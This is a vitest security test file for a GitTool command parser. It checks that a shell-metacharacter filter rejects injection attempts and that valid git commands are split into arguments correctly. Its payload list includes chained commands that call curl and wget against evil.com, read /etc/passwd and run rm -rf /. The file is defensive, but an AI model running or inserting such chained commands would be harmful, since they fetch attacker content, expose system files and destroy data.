// Security tests for GitTool command injection prevention

import { describe, it, expect } from 'vitest';
import { spawn } from 'child_process';

// Replicate the shell metacharacter filter and arg parser from GitTool
// for testing without importing the tool directly (which triggers side effects)
const SHELL_METACHAR_REGEX = /[;&|`$(){}!#~<>\n\r]/;

function parseGitArgs(command: string): string[] {
  const trimmed = command.trim();
  if (!trimmed) throw new Error('Empty git command');

  if (SHELL_METACHAR_REGEX.test(trimmed)) {
    throw new Error(
      `Git command contains forbidden shell metacharacters: ${trimmed.slice(0, 100)}`
    );
  }

  const args: string[] = [];
  let current = '';
  let inSingle = false;
  let inDouble = false;

  for (let i = 0; i < trimmed.length; i++) {
    const ch = trimmed[i];

    if (inSingle) {
      if (ch === "'") {
        inSingle = false;
      } else {
        current += ch;
      }
    } else if (inDouble) {
      if (ch === '"') {
        inDouble = false;
      } else if (ch === '\\' && i + 1 < trimmed.length) {
        const next = trimmed[i + 1];
        if (next === '"' || next === '\\') {
          current += next;
          i++;
        } else {
          current += ch;
        }
      } else {
        current += ch;
      }
    } else if (ch === "'") {
      inSingle = true;
    } else if (ch === '"') {
      inDouble = true;
    } else if (ch === ' ' || ch === '\t') {
      if (current.length > 0) {
        args.push(current);
        current = '';
      }
    } else {
      current += ch;
    }
  }

  if (current.length > 0) args.push(current);
  return args;
}

describe('GitTool Command Injection Prevention', () => {
  describe('Shell Metacharacter Rejection', () => {
    const injectionPayloads = [
      'status; curl evil.com',
      'log | cat /etc/passwd',
      'branch && rm -rf /',
      'status $(curl evil.com)',
      'status `curl evil.com`',
      'log > /tmp/evil',
      'diff <(curl evil.com)',
      'status\ncurl evil.com',
      'log & wget evil.com',
      'rev-parse HEAD; # comment',
    ];

    for (const payload of injectionPayloads) {
      it(`rejects injection: "${payload.slice(0, 40)}"`, () => {
        expect(() => parseGitArgs(payload)).toThrow(/forbidden shell metacharacters/i);
      });
    }
  });

  describe('Valid Commands Parse Correctly', () => {
    it('parses simple status command', () => {
      expect(parseGitArgs('status')).toEqual(['status']);
    });

    it('parses command with arguments', () => {
      expect(parseGitArgs('log --oneline -n 10')).toEqual(['log', '--oneline', '-n', '10']);
    });

    it('parses command with quoted arguments', () => {
      expect(parseGitArgs('commit -m "fix: security update"')).toEqual([
        'commit', '-m', 'fix: security update',
      ]);
    });

    it('parses command with single-quoted arguments', () => {
      expect(parseGitArgs("commit -m 'fix: security update'")).toEqual([
        'commit', '-m', 'fix: security update',
      ]);
    });

    it('parses diff with path', () => {
      expect(parseGitArgs('diff -- src/tools/GitTool/index.ts')).toEqual([
        'diff', '--', 'src/tools/GitTool/index.ts',
      ]);
    });

    it('parses rev-parse', () => {
      expect(parseGitArgs('rev-parse HEAD')).toEqual(['rev-parse', 'HEAD']);
    });

    it('handles multiple spaces', () => {
      expect(parseGitArgs('log    --oneline')).toEqual(['log', '--oneline']);
    });

    it('handles tab separators', () => {
      expect(parseGitArgs('log\t--oneline')).toEqual(['log', '--oneline']);
    });
  });

  describe('Empty Command Rejection', () => {
    it('rejects empty string', () => {
      expect(() => parseGitArgs('')).toThrow(/empty/i);
    });

    it('rejects whitespace-only', () => {
      expect(() => parseGitArgs('   ')).toThrow(/empty/i);
    });
  });

  describe('Escaped Quotes in Double-Quoted Strings', () => {
    it('handles escaped double quotes', () => {
      expect(parseGitArgs('commit -m "say \\"hello\\""')).toEqual([
        'commit', '-m', 'say "hello"',
      ]);
    });

    it('handles escaped backslash', () => {
      expect(parseGitArgs('commit -m "path\\\\to\\\\file"')).toEqual([
        'commit', '-m', 'path\\to\\file',
      ]);
    });
  });

  describe('Complex Safe Commands', () => {
    it('parses branch with pattern', () => {
      expect(parseGitArgs('branch -r --contains HEAD')).toEqual([
        'branch', '-r', '--contains', 'HEAD',
      ]);
    });

    it('parses log with format', () => {
      expect(parseGitArgs('log --format="%h %s" -5')).toEqual([
        'log', '--format=%h %s', '-5',
      ]);
    });
  });
});
